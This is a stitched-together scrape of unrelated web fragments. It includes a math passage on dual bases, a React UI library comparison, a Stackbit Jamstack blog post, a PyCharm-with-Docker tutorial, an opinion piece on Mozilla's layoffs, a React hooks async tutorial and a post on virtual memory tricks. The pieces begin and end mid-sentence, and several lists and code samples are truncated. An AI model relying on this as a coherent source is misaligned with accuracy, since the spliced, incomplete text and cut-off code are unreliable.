\eqref{eq:computedualbasis1} to compute</p>

<p>and obtain the dual basis vectors as
$\Be^1=[0.4,-0.4]$ and $\Be^2=[0.2,0.8]$.
The result is given in the
following figure,</p>
<figure>
<p><img src="https://solmaz.io/img/duality_vector_spaces/fig2.svg"></p>
</figure>
<p>where one can see that $\Be_1\perp\Be^2$, $\Be^1\perp\Be_2$.</p>
<figure>
<p><img src="https://solmaz.io/img/duality_vector_spaces/fig1.svg">
A body $\CB$ embedded in $\IR^2$ with curvilinear coordinates.
Every point $\CP$ at $\BX$ has an associated two-dimensional vector space,
called $\CB$’s tangent space at $\BX$, denoted $\tang_\BX\CB$. The basis
$\Be_i$ corresponding to coordinates $\theta_i$ are not necessarily
orthogonal and can admit corresponding duals $\Be^i$, due to
curvilinearity.
The coordinates appear to be affine at the point’s immediate vicinity,
and thus in the tangent space.</p>
</figure>
<p>The introduction of the dual space
allows us to reinterpret a one-form $\Balpha$
as an object residing in the dual space. In fact,
the <strong>canonical duality</strong> $\CV^{\ast\ast}=\CV$
states that every vector $\Bv$ can be interpreted as a functional
on the space $\CV^\ast$ via</p>

<p>I actually rate Bootstrap relatively highly as a UI library. It’s not going to win you any design awards, but it gets the job done for side projects and minimum viable products.</p>
<p>It depends what you want to use it for, though. If you’re new to React, it’s a great library to use to get started. As a more experienced developer, chances are you’ll want to look into styled-components/Emotion.</p>
<p>There are two popular libraries with React bindings for Bootstrap, I’ve personally only used Reactstrap.</p>
<p>Project links:</p>
<ul>
<li>
<p><a href="https://react-bootstrap.github.io/">React Bootstrap</a></p>
<ul>
<li>Bundle Size (from <a href="https://bundlephobia.com/result?p=react-bootstrap@1.3.0">BundlePhobia</a>): 111kB minified, 34.4kB minified + gzipped, less with treeshaking</li>

<li>Bundle Size (from <a href="https://bundlephobia.com/result?p=reactstrap@8.5.1">BundlePhobia</a>): 152.1kB minified, 39.4kB minified + gzipped, less with treeshaking</li>
</ul>
</li>
</ul>
<p>Pros:</p>
<ul>
<li>The Bootstrap library that you know and love, with React bindings</li>
<li>Easily customised via CSS-in-JS</li>
<li>It’s been around long enough with widespread usage that bugs/issues aren’t a worry</li>
<li>Quick to get started</li>
<li>No jQuery dependency as it’s been reimplemented entirely in React</li>
</ul>
<p>Cons:</p>
<ul>
<li>It’s Bootstrap: your site will look like everyone elses if you don’t customise it</li>

<p>Bulma is different to most libraries presented here because it’s purely a CSS framework, no JS required. You can choose to either use the classes from Bulma directly, or use a wrapper library such as <code>react-bulma-components</code>.</p>
<p>Project links:</p>

</ul>
</li>
</ul>
<p>Pros:</p>
<ul>
<li>Doesn’t have the Bootstrap look and feel</li>
<li>Good for getting something up and running quickly</li>
<li>Modern features (Flexbox/Grid under the hood)</li>
</ul>
<p>Cons:</p>
<ul>
<li>Accessibility: there’s some, but doesn’t follow WCAG guidelines as strongly as other libraries</li>

<p>Material UI is one of those libraries that I love to hate. It has helped me get through some extremely tight deadlines for clients in the past, but I always end up removing it in favour of almost anything else as soon as possible.</p>
<p>In the past you could only customise Material UI’s styles by writing <a href="https://cssinjs.org/?v=v10.3.0#jss-example">JSS</a>, but thankfully it’s now <a href="https://material-ui.com/guides/interoperability/#styled-components">possible to override styles</a> with styled-components and Emotion.</p>

<li>Comprehensive documentation</li>

August 14, 2020 | https://www.stackbit.com/blog/create-a-jamstack-site-in-minutes/ | <a href="https://web.archive.org/web/*/https://www.stackbit.com/blog/create-a-jamstack-site-in-minutes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="___gatsby"><div tabindex="-1" id="gatsby-focus-wrapper"><div id="page"><main id="content"><article><div><p><img src="https://www.stackbit.com/images/jamstack-site-minutes.png" alt="How to Create a Jamstack Website in Minutes!"></p><div><p>The Stackbit Site Builder created a CMS connected Jamstack site with just a few clicks and in just minutes. Let's explore how.</p><p>At Stackbit, we believe that the Jamstack can help make a better web for everyone because Jamstack sites are fast and secure. We want to make it easy for any developer to adopt the Jamstack for their next project. That's why one of the foundational elements that has defined Stackbit since day one has been the ability to generate a Jamstack site with just a few clicks. The basic steps are:</p><h2>1. Choose a theme</h2><p>We currently have eight themes to choose from, including our new, highly customizable theme called <a href="https://themes.stackbit.com/demos/starter/">Starter</a>. Plus, there are dozens of community themes available on GitHub, such as the popular <a href="https://github.com/snipcart/stackbit-theme-planty">Planty ecommerce theme</a> by Snipcart, or even more on <a href="https://jamstackthemes.dev/">JamstackThemes.dev</a>. You also have the ability to import a custom theme of your own (for details on how to configure that, you can <a href="https://docs.stackbit.com/site-builder/custom-themes/">check the docs</a>)</p><h2>2. Choose a static site generator (SSG)</h2><p>All of our themes can be generaed using Gatsby, Hugo or Jekyll (with additional support coming <em>very</em> soon...but I won't spoil the surprise). This gives you options to choose the tool and language you prefer to use for developing your Jamstack site. (Not sure which one to choose? <a href="https://www.stackbit.com/blog/choosing-your-ssg/">We have some advice here</a>.)</p><h2>3. Choose a headless content management system (CMS)</h2><p>One of the powerful things about buildng a site through the Stackbit site builder is that it is pre-configured for content management through your choice of <a href="https://www.stackbit.com/blog/what-is-a-headless-cms/">headless CMS</a>, including Sanity, Contentful, DataCMS, Forestry and NetilfyCMS. We've even added a new option for using files in your GitHub repository that can still get the full inline content editing features in Stackbit. (More on that in an upcoming post!)</p><p>One you've made these three choices, you are ready to go. Stackbit will build the site, place the source in GitHub and deploy to Netlify. Within minutes your site is ready and deployed!</p><p>Let's be honest though, telling you about this is far less exciting than simply showing you...so let's see what this looks like in action.</p><iframe width="560" height="315" src="https://www.youtube.com/embed/d1Xlr4L44KE" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><h2>Make the site your own</h2><p>The really important thing you should know about your new Jamstack site is that <strong>the code is yours.</strong> The code ends up in a GitHub respository you own. You can edit and customize it as you wish. In fact, we've made it easy to get your site running on your local machine and start editing by providing the instructions in the project's <code>README.md</code> or via Stackbit's online editor. This gives you the ability to do things like:</p><ul><li><a href="https://www.stackbit.com/blog/stackbit-gatsby-site-improvements/">Add a favicon, analytics, social sharing and a sitemap</a></li><li><a href="https://www.stackbit.com/blog/gatsby-search/">Add site search using Algolia</a></li><li><a href="https://www.stackbit.com/blog/jamstack-gatsby-mailchimp/">Add a mailing list form that connects to Mailchimp</a></li><li><a href="https://www.stackbit.com/blog/complete-guide-netlify-forms/">Customize how your form submissions are handled</a></li></ul><p>...and anything else you can think of!</p><p>The best part is that everything I have described to you here is also available at no cost. Just head on over to the <a href="https://app.stackbit.com/create">Stackbit Site Builder</a> and start creating your Jamstack site!</p></div></div></article></main></div></div></div></div>]]>

While we have relied on Jupyter notebooks for setting up our code, this time we’re going to use an IDE. We will be using PyCharm Professional as the demonstrative example, however the corresponding functionalities also appear to be made available through the Python plugin of IDEA Ultimate Edition.</p><p id="73f0"><strong><em>NOTE</em></strong><em>: Unfortunately, most features required for this tutorial, including setting up a Docker-based Python interpreter, and the Scientific view functionalities, are restricted to the paid-for versions of the software.

For the project category, we’ll be going with “Scientific”. The tricky part is defining the interpreter. On project creation, we select the system one, and <strong>not</strong> a remote one. This is because, for some reason, PyCharm will not let us create a project with a Docker interpreter outright (perhaps because Docker interpreter support is a relatively new feature).</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1556/1*vq8PDBwcEU4fQg5Xj5cYbw.png" width="778" height="487" srcset="https://miro.medium.com/max/552/1*vq8PDBwcEU4fQg5Xj5cYbw.png 276w, https://miro.medium.com/max/1104/1*vq8PDBwcEU4fQg5Xj5cYbw.png 552w, https://miro.medium.com/max/1280/1*vq8PDBwcEU4fQg5Xj5cYbw.png 640w, https://miro.medium.com/max/1400/1*vq8PDBwcEU4fQg5Xj5cYbw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*vq8PDBwcEU4fQg5Xj5cYbw.png?q=20"></p></div></div></div></figure><p id="7afa">We will subsequently be greeted with a new project window. <strong>Now</strong> we can define the final interpreter.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2096/1*UF9IdPLSboS5Das3morvfQ.png" width="1048" height="729" srcset="https://miro.medium.com/max/552/1*UF9IdPLSboS5Das3morvfQ.png 276w, https://miro.medium.com/max/1104/1*UF9IdPLSboS5Das3morvfQ.png 552w, https://miro.medium.com/max/1280/1*UF9IdPLSboS5Das3morvfQ.png 640w, https://miro.medium.com/max/1400/1*UF9IdPLSboS5Das3morvfQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*UF9IdPLSboS5Das3morvfQ.png?q=20"></p></div></div></div></figure><p id="2227">Once there, select <code>Docker</code>, and the desired image from the ones present in your local Docker image store.

Specifically, let’s plot the training parameters available in the <code>History</code> object:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/744/1*JK28wf4b7wHUkY6VxrkQ-w.png" width="372" height="204" srcset="https://miro.medium.com/max/552/1*JK28wf4b7wHUkY6VxrkQ-w.png 276w, https://miro.medium.com/max/744/1*JK28wf4b7wHUkY6VxrkQ-w.png 372w" sizes="372px" data-old-src="https://miro.medium.com/max/60/1*JK28wf4b7wHUkY6VxrkQ-w.png?q=20"></p></div></div></figure><p id="99c9">Unfortunately, if we’d try it without any prep, we would immediately hit a snag — JetBrains’ software has <a href="https://youtrack.jetbrains.com/issue/PY-32668" target="_blank" rel="noopener">several</a> <a href="https://youtrack.jetbrains.com/issue/PY-27489" target="_blank" rel="noopener">outstanding</a> <a href="https://youtrack.jetbrains.com/issue/PY-33558" target="_blank" rel="noopener">issues</a> that prevent the operation of the plotting functionality without workarounds.</p><p id="3d70">As it is evident from the bug reports, the core issue is a lack of connectivity between the IDE and <code>matplotlib</code>. Normally, we would solve this problem by using appropriate initialization arguments for the Docker container, but there does not appear to be a way to do that in the remote interpreter settings.</p><p id="293d">What we <em>can</em> do, however, is to create a Docker Compose file, with a sufficient workaround:</p><figure><div></div></figure><p id="2614">Next, we set up a Docker Compose remote interpreter like so:</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1742/1*afp7RMPWlq-ZtB0YcBNHsw.png" width="871" height="574" srcset="https://miro.medium.com/max/552/1*afp7RMPWlq-ZtB0YcBNHsw.png 276w, https://miro.medium.com/max/1104/1*afp7RMPWlq-ZtB0YcBNHsw.png 552w, https://miro.medium.com/max/1280/1*afp7RMPWlq-ZtB0YcBNHsw.png 640w, https://miro.medium.com/max/1400/1*afp7RMPWlq-ZtB0YcBNHsw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*afp7RMPWlq-ZtB0YcBNHsw.png?q=20"></p></div></div></div></figure><p id="3ae5">Now we wait for the indexing to finish, restart the Python console, and add one more code cell:</p><figure><div></div></figure><p id="34b0">and we should end up with a corresponding graph on the Plots view pane:</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1690/1*Io2TEghkXsp_gRyPpTVD_g.png" width="845" height="781" srcset="https://miro.medium.com/max/552/1*Io2TEghkXsp_gRyPpTVD_g.png 276w, https://miro.medium.com/max/1104/1*Io2TEghkXsp_gRyPpTVD_g.png 552w, https://miro.medium.com/max/1280/1*Io2TEghkXsp_gRyPpTVD_g.png 640w, https://miro.medium.com/max/1400/1*Io2TEghkXsp_gRyPpTVD_g.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*Io2TEghkXsp_gRyPpTVD_g.png?q=20"></p></div></div></div></figure><p id="980a">We have built upon the <a target="_blank" rel="noopener" href="https://sml.io/setting-up-tensorflow-with-gpu-acceleration-the-quick-way-add80cd5c988">previous blog entry</a>, trading a reliance on Jupyter for a traditional IDE. We have thus gained features such as an arguably improved code completion and documentation access, as well as, potentially, an augmented sense of familiarity with the tools being used.</p><p id="c545">As is apparent from our little demo, remote interpreter support is still in the process of being fully integrated into the tooling. Nevertheless, it already works relatively well. As a fallback, it’s always possible to have two projects — one for data analysis and preprocessing (using a local interpreter), and one for training (using a remote interpreter).</p><p id="a905">Nevertheless, do take a look at PyCharm’s <a href="https://www.jetbrains.com/pycharm/features/scientific_tools.html" target="_blank" rel="noopener">feature set</a> and the associated <a href="https://www.jetbrains.com/help/pycharm/matplotlib-tutorial.html" target="_blank" rel="noopener">tutorial</a> for more information.</p></div></div></section></div></div>]]>

<p><i>Disclaimer: I’m not a current or former Mozilla employee and have no other affiliation with Mozilla.</i> This is my own analysis of the publically-available information surrounding Mozilla’s decision to <a href="https://blog.mozilla.org/blog/2020/08/11/changing-world-changing-mozilla/">radically downsize</a> in a way that seems to further threaten Firefox’s future.

</p><p>A lot of people are very angry at Mozilla’s management for their decision to restructure the foundation, which is <a href="https://twitter.com/withoutboats/status/1217558588857544704">not unreasonable.</a> But seen in context, I think most people would, if in their position, make the same decision.

</p><p>Why is Mozilla cutting staff on its most popular product (Firefox) and refocusing on things that look like unsuccessful stunt projects? <a href="https://medium.com/swlh/could-google-crush-firefox-in-2020-13a55b5d4526">Because they’re about to lose the revenue from it.</a> <em>Google</em> is to blame for not renewing the contract that gives Mozilla a share of the ad revenue from the Firefox search bar. The web browser market has been walking on thin ice since 2008 when Chrome came out, because with Chrome available and under its own control, Google no longer had a reason to support the ecosystem with revenue-sharing deals. Now it seems like Google wants to see just how thin it can make the ice before Mozilla goes under.

</p><p>And why are they focussing on products nobody uses? Because they can make money by selling VPN subscriptions and premium bookmarking accounts without depending on the (obviously limited) goodwill of their competitors.

</p><p>What can you do about this? Here are some suggestions:

</p><ul>
  <li><strong>Buy one of Mozilla’s other products.</strong> It might seem like validating the bad decision made by Mozilla management, but it is reasonable to hope that income from, say, Mozilla VPN might be enough to keep a rag-tag Firefox team going.
  </li><li><strong>Just straight up <a href="https://donate.mozilla.org/">donate to Mozilla.</a></strong> Remember, Mozilla is a non-profit organization. While Google is developing Chrome to strengthen its bottom line and pay out more to shareholders, Mozilla’s interest in the Web platform is actually public-spirited. They fought against DRM in HTML and the mandatory use of patent-encumbered technologies on the open web, and when these efforts failed (largely for the same reasons Google is now able to crush Firefox entirely) they adopted laudable compromises, giving their users a genuine choice about using these technologies. And more than that&nbsp;—&nbsp;they’re actively participating in projects to create new, widely-supported and superior alternatives to these problematic technologies for the future. The web would be a worse place without Mozilla, and for that they deserve your goodwill.
  </li><li><strong>Write to your lawmaker urging an investigation into Google’s anti-competitive practices</strong> in the web browser and web markup space. This could be particularly effective if you live in the EU and write to your European Parliamentarians. Google is probably counting on the Trump administration not caring about their blatant repeat of Microsoft’s anti-trust violations&nbsp;— but other major jurisdictions which still have functioning regulatory systems can make a difference.
  </li><li><strong>Actually use Firefox, or one of its derivatives like the Tor Browser.</strong> One reason Google feels able to do this is probably because of Firefox’s shrinking market share. But Firefox is a vital part of the browser ecosystem, not least as the only major browser left that isn’t based on a WebKit-derivative engine, and as a hackable open-source browser that’s a vital component of equally-vital privacy projects like Tor. And Firefox still has really great features, especially for web developers. Switch back to Firefox&nbsp;— especially if you’re on Chrome!
  </li><li><strong>Switch away from Google products as much as possible.</strong> I know that other web search engines are still embarrassingly bad&nbsp;—&nbsp;I’m not here to guilt-trip anyone into using DuckDuckGo. But if you use Gmail, stop. There are <a href="https://www.fastmail.com/">fantastic</a> <a href="https://protonmail.com/">alternatives</a> out there which, yes, filter spam just as well as Gmail does these days. Use Apple Maps or OpenStreetMap or Yelp instead of Google Maps. Run an ad blocker that blocks YouTube ads, and support your favourite YouTubers directly over Patreon instead.
</li></ul>

August 14, 2020 | https://lukstei.com/2019-10-27-doing-asynchronous-calls-using-react-hooks#1 | <a href="https://web.archive.org/web/*/https://lukstei.com/2019-10-27-doing-asynchronous-calls-using-react-hooks#1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>
Doing asynchronous calls using React hooks is not straightforward.
One has to know how correctly write a functional component and also comply to the <a href="https://reactjs.org/docs/hooks-rules.html">Rules of hooks</a>.</p>
<p>In this post we discover various challenges doing asynchronous calls when using functional components.
We then build our own custom hooks, one which triggers the asynchronous calls when the component is mounted and one that triggers the call imperatively (e.g. when a button is clicked).</p>
<blockquote>
<p>With “asynchronous function” or “asynchronous call” we mean any javascript function, which triggers a side effect and returns a standard javascript <code>Promise</code>. At some point, the promise will either be resolved (on success) or be rejected (if an error occurs). If the promise is not yet resolved or rejected, it is in the loading state.</p>
</blockquote>
<blockquote>
<p>In our examples we use the <code>fetch</code> function, but the asynchronous function could be any function which returns a promise.</p>
</blockquote>
<h2>Naive approach</h2>
<p>One could just trigger the asynchronous call directly in the render method:</p>
<div data-language="jsx"><pre><code><span>import</span> React<span>,</span> <span>{</span> useState <span>}</span> <span>from</span> <span>"react"</span>

<span>export</span> <span>default</span> <span>function</span> <span>Example</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> <span>[</span>result<span>,</span> setResult<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>)</span>
  <span>const</span> <span>[</span>error<span>,</span> setError<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>)</span>
  <span>const</span> <span>[</span>isLoading<span>,</span> setIsLoading<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>true</span><span>)</span>

<span>  <span>const</span> <span>doCall</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>fetch</span><span>(</span><span>"/api/users"</span><span>)</span><span>.</span><span>then</span><span>(</span><span>r</span> <span>=&gt;</span> r<span>.</span><span>text</span><span>(</span><span>)</span><span>)</span></span>
<span>  <span>doCall</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span></span><span>    <span>r</span> <span>=&gt;</span> <span>{</span></span><span>      <span>setIsLoading</span><span>(</span><span>false</span><span>)</span></span><span>      <span>setResult</span><span>(</span>r<span>)</span></span><span>    <span>}</span><span>,</span></span><span>    <span>e</span> <span>=&gt;</span> <span>{</span></span><span>      <span>setIsLoading</span><span>(</span><span>false</span><span>)</span></span><span>      <span>setError</span><span>(</span>e<span>)</span></span><span>    <span>}</span></span><span>  <span>)</span></span>
  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span></span><span>&gt;</span></span><span></span>
<span>      </span><span>{</span>isLoading <span>&amp;&amp;</span> <span><span><span>&lt;</span>p</span><span>&gt;</span></span><span>Loading data...</span><span><span><span>&lt;/</span>p</span><span>&gt;</span></span><span>}</span><span></span>
<span>      </span><span>{</span>error <span>&amp;&amp;</span> <span><span><span>&lt;</span>p</span><span>&gt;</span></span><span>An error occurred</span><span><span><span>&lt;/</span>p</span><span>&gt;</span></span><span>}</span><span></span>
<span>      </span><span>{</span>result <span>&amp;&amp;</span> <span><span><span>&lt;</span>div</span><span>&gt;</span></span><span>{</span>result<span>}</span><span><span><span>&lt;/</span>div</span><span>&gt;</span></span><span>}</span><span></span>
<span>    </span><span><span><span>&lt;/</span></span><span>&gt;</span></span>
  <span>)</span>
<span>}</span></code></pre></div>
<p>In the example above we directly trigger the call inside the body of the render function.
Remember, when using a functional component, as we do, the function body itself is the render method (we directly return the components to be rendered).</p>
<p>One problem in this example is, that it is not allowed to do side effects directly inside the body of the render method. Quoting the React documentation:</p>
<blockquote>
<p>All React components must act like pure functions with respect to their props.</p>
</blockquote>
<p>Additionally, a cleanup when the component unmounts is not happening. Imagine, the promise returned by the <code>doCall</code> function takes 10 seconds to resolve and in the meantime, the component is unmounted. The function <code>setResult</code> is still called, which could possibly lead to memory leaks.</p>
<p>When the promise is resolved and the component is already unmounted, we would get a warning like <em>“Warning: Can’t perform a React state update on an unmounted component. This is a no-op, but it indicates a memory leak in your application. To fix, cancel all subscriptions and asynchronous tasks in a useEffect cleanup function.”</em></p>
<p>One last problem is, that the call is executed every time the component is re-rendered, which could happen anytime.</p>
<p>So how can we do better?</p>
<h2>Using the effect hook</h2>
<p>The right way to do side effects in a functional component is to use the <code>useEffect</code> hook.
We need to pass the (wrapped) asynchronous function as the first argument to the <code>useEffect</code> hook:</p>
<div data-language="jsx"><pre><code><span>import</span> React<span>,</span> <span>{</span> useEffect<span>,</span> useState <span>}</span> <span>from</span> <span>"react"</span>

<span>export</span> <span>default</span> <span>function</span> <span>Example</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> <span>[</span>result<span>,</span> setResult<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>)</span>
  <span>const</span> <span>[</span>error<span>,</span> setError<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>)</span>
  <span>const</span> <span>[</span>isLoading<span>,</span> setIsLoading<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>true</span><span>)</span>

<span>  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span></span>    <span>const</span> <span>doCall</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>fetch</span><span>(</span><span>"/api/users"</span><span>)</span><span>.</span><span>then</span><span>(</span><span>r</span> <span>=&gt;</span> r<span>.</span><span>text</span><span>(</span><span>)</span><span>)</span>

    <span>doCall</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span>
      <span>r</span> <span>=&gt;</span> <span>{</span>
        <span>setIsLoading</span><span>(</span><span>false</span><span>)</span>
        <span>setResult</span><span>(</span>r<span>)</span>
      <span>}</span><span>,</span>
      <span>e</span> <span>=&gt;</span> <span>{</span>
        <span>setIsLoading</span><span>(</span><span>false</span><span>)</span>
        <span>setError</span><span>(</span>e<span>)</span>
      <span>}</span>
    <span>)</span>
  <span>}</span><span>)</span>

  <span>return</span> <span>(</span>

<p>When using the <code>useEffect</code> hook we are doing side effects the correct way.</p>
<p>By default, the function passed to the <code>useEffect</code> hook is called for every rerender, which would cause our call to be executed for every props or state change, which we in our example certainly do not want.</p>
<p>To control this behaviour, we can pass a second argument to the <code>useEffect</code> hook, which is an array which defines the dependencies of the passed function.
When some value inside the dependency array changes, the effect is re-executed.</p>
<p>When passing an empty array, which effectively means, the effect has no dependencies, then the passed function is only executed once when the component is mounted.
This is the behaviour we want in our example.</p>

<p>When the asynchronous call is dependent on some value and we want to re-trigger the call based on when some state changes or when property passed to the component changes, we explicitly need to add it to the dependencies array.</p>
<p>Imagine, we have a component which displays a user based on the passed user id, we need to pass the <code>userId</code> value as a dependency:</p>

  <span>)</span>
<span>}</span></code></pre></div>
<p>When using the <code>useEffect</code> hook, we solved the issue with the prohibited side effects in the render method.
However when using calls with dependencies (e.g. like in the example above), we actually introduced a new problem:
When the effect is re-triggered and our asynchronous function is called again, we now have a race condition.</p>
<p>Imagine, the component is rendered as <code>&lt;ShowUser userId={1} /&gt;</code>. When the component is mounted, the call to load user 1 is triggered as expected.
Now the component’s <code>userId</code> property changes: <code>&lt;ShowUser userId={2} /&gt;</code>. The component is then re-rendered with the changed property.
Subsequently also the effect is re-executed and the call to load user 2 is triggered.
Everything works as expected unless in some (possibly) rare cases, the first call takes longer to resolve than the second call. What would happen in this case, first the <code>setResult(&lt;user 2&gt;)</code> is called, and after the first call finally is resolved <code>setResult(&lt;user 1&gt;)</code>. This in turn would then certainly display the wrong user.</p>
<p>Remember, one additional challenge in the naive approach was, that there was no cleanup function, which could lead to problems, when the component is unmounted.</p>
<p>We can solve both problems using a cleanup function inside the effect.
In the function passed to the <code>useEffect</code> hook, we can return a callback function, which is executed when the effect is cleaned up. This cleanup happens each time the dependency array changes and at the very end, i.e. when the component is unmounted.</p>
<p>In our simple example, we just want to ignore the results after cleanup when the promise is resolved or rejected.</p>
<blockquote>
<p>If the API would support it, we could also, for example, cancel the fetch in the cleanup callback, effectively avoiding doing unnecessary work after the effect is cleaned up.</p>

<p>As we see in the example above, the discussed race condition cannot happen anymore, because the cleanup function is called when the dependencies (in our case the <code>userId</code>) change, and the result is then ignored when the promise is resolved or rejected.</p>
<h2>Creating our own custom hook</h2>
<p>Since we do have to take care for a lot of things to do for one asynchronous call, we can create our own custom hook, which abstracts the details of doing the calls the right way away.</p>
<p>A custom hook is a function which itself calls other hooks. Of course must also comply to the rules of hooks.</p>
<p>In our custom hook, the caller needs to have access to the loading and result states (<code>result</code>, <code>error</code>, <code>isLoading</code>) and of course we need to pass the asynchronous function to be triggered to the hook (including the dependencies of the call).
Everything else can be abstracted away.
Inside the hook we can just use the <code>useEffect</code> hook with the same ideas as in the examples above.</p>
<p>To pass the state and result variables we use the array deconstruction syntax, which is also used by the other built-in hooks, so we return everything the caller needs to know in one array.</p>

    <section>
      <p>I’ve been planning for some time to make a post about things you can do with <a href="https://en.wikipedia.org/wiki/Virtual_memory">virtual memory</a>, so when <a href="https://twitter.com/jimsagevid">@jimsagevid</a> <a href="https://twitter.com/jimsagevid/status/920351713529344003">tweeted</a> me about virtual memory in response to my last post, I felt the time was right.</p>



<p>Virtual memory is funny. As programmers, we <em>know</em> that it’s there (on all modern CPUs and OSs), but we tend to forget about it, perhaps because it’s not directly exposed in our programming languages. Or, we just think of it as the thing that makes our software run really slow instead of crashing, when it runs out of physical RAM.</p>

<p>But, it turns out, if you actually make use of what virtual memory can do, you can achieve some pretty cool things.</p>

<h2 id="obscenely-big-array">Obscenely big array</h2>

<p>To recap — in my <a href="https://ourmachinery.com/post/multi-threading-the-truth/">last post</a> I faced the problem of wanting a big lookup table from object IDs to object pointers. Furthermore, I wanted this table to stay fixed in memory, so that writers could atomically replace pointers in the table without disturbing readers. This means that using something like a <code>std::vector</code> is not possible, since the underlying data will be reallocated when the vector grows.</p>

<p>A fixed array works:</p>

<pre><code>object_o *objects[MAX_OBJECTS].
</code></pre>

<p>But what size should we use for the array? Pick a big size, and we’re wasting memory. Pick a small size, and we might run out of objects. In the article, I used a hierarchical approach, but as <a href="https://twitter.com/jimsagevid">@jimsagevid</a> pointed out, we could use virtual memory instead, and avoid the complexity of a hierarchical table layout.</p>

<p>When we allocate memory through the virtual memory system we reserve address space for the pages we allocate immediately (no other code can allocate memory in that address range), but actual physical memory is not allocated until we actually touch the pages.</p>

<p>So for this situation, we can just pick a comfortably large number for our array and virtually allocate it. Say <em>1 billion</em> of objects, for example:</p>

<pre><code>#define MAX_OBJECTS 1000000000ULL
object_o **objects = virtual_alloc(MAX_OBJECTS * sizeof(object_o *));
</code></pre>

<p>We’re using 8 GB of address space and virtual memory, but only as much physical memory as we actually need for our objects. A simple solution that only requires one line of code.</p>

<p>Note: I’m using <code>virtual_alloc()</code> here as my OS agnostic virtual memory allocation call. On Windows you would actually call <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=2&amp;ved=0ahUKEwjE__aguZ7XAhUNwGMKHWPIDkAQFgguMAE&amp;url=https%3A%2F%2Fmsdn.microsoft.com%2Fen-us%2Flibrary%2Fwindows%2Fdesktop%2Faa366887(v%3Dvs.85).aspx&amp;usg=AOvVaw3EQf1l0Ifuh9GKCNmSmO6x">VirtualAlloc()</a> and on Linux <a href="http://man7.org/linux/man-pages/man2/mmap.2.html">mmap()</a>.</p>

<p>Another note: Windows separates virtual memory allocation into separate <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx">MEM_RESERVE</a> and <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx">MEM_COMMIT</a> calls. <em>MEM_RESERVE</em> reserves address space and <em>MEM_COMMIT</em> commits it to physical memory. That does <em>not</em> mean that physical memory is actually allocated when you <em>MEM_COMMIT</em>, the physical memory is still not allocated until you actually touch the pages. But <em>MEM_COMMIT</em> reserves memory in the page file, and if you try to commit more memory than you have in your page file, <em>MEM_COMMIT</em> will fail. So on Windows, you probably don’t want to <em>MEM_COMMIT</em> the entire lookup table (because you only have a limited size page file). Instead you want to <em>MEM_RESERVE</em> the whole table in the beginning and then just <em>MEM_COMMIT</em> the range of the table that you actually use.</p>

<p>In contrast, Linux allows <em>overcommitting</em> — i.e., you can commit more memory than the size of your page file. For this reason, Linux doesn’t need separate reserve/commit operations which makes the virtual memory a lot simpler to use.</p>

<p>Is reserving 8 GB of virtual memory for the array a problem? Not really. There are two limits that concern us here. The first is <em>address space</em>. In a 64-bit application (which we assume), the address space is 2<sup>64</sup>, a staggeringly large number with room for billions of gigabyte-sized arrays. The second limit is for virtual memory. The OS typically doesn’t let us allocate the whole possible address space as virtual memory. On 64-bit Windows, for example, we can only allocate 256 TB of virtual memory. Still, that’s room for 32 000 arrays of 8 GB each, so as long as we don’t go totally crazy, we’re fine.</p>

<p>In fact, you could probably use this technique for <em>all</em> global or semi-global arrays in your application without any problems.</p>

<p>Remember the old-school C way of writing games with static arrays for all objects:</p>

<pre><code>uint32_t num_tanks;
tank_t tanks[MAX_TANKS];

uint32_t num_bullets;
bullet_t bullets[MAX_BULLETS];

...
</code></pre>

<p>If you write code like this, you can be sure that someone will complain that it’s not “future-proof”, since you have caps on the number of objects. That is kind of ridiculous, but to satisfy the complaint in a simpler and more fun way than using a <code>std::vector</code>  you can just get rid of the <code>MAX_*</code> defines and allocate 1 GB of virtual memory for each array:</p>

<pre><code>#define GB 1000000000
uint32_t num_tanks;
tank_t *tanks = virtual_alloc(GB);
uint32_t num_bullets;
bullet_t *bullets = virtual_alloc(GB);
</code></pre>

<h2 id="application-wide-unique-ids">Application wide unique IDs</h2>

<p>A lot of game engine systems need unique IDs to identify objects. Usually the code looks something like this:</p>

<pre><code>uint64_t allocate_id(system_t *sys)
{
    return sys-&gt;next_free_id++;
} 
</code></pre>

<p>But virtual memory gives us another option. Instead of using integers as identifiers, we could use addresses reserved from the virtual memory system. This allows us to create IDs that are unique, not just in the current system, but throughout the entire application. And since we never actually use the memory pointed to by these addresses, we won’t consume any physical memory.</p>

<p>It might look something like this:</p>

<pre><code>system_id_t *allocate_id(system_t *sys)
{
    if (!sys-&gt;id_block || sys-&gt;id_block_used == PAGE_SIZE) {
        sys-&gt;id_block = virtual_alloc(PAGE_SIZE);
        sys-&gt;id_block_used = 0;
    }
